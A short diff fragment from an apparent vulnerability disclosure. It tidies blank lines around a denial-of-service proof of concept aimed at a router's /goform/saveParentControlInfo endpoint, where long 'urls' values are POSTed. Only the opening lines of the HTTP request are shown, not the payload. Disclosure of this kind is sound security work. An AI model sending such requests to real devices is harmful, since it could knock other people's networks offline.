@@ -30,18 +30,6 @@ So by POSTing the page `/goform/saveParentControlInfo` with long `urls`, the att
 
 Poc of Denial of Service(DoS):
 
-
-
-
-
-```http
-
-```
-
-
-
-
-
 ```http
 POST /goform/saveParentControlInfo HTTP/1.1
 Host: 192.168.2.1
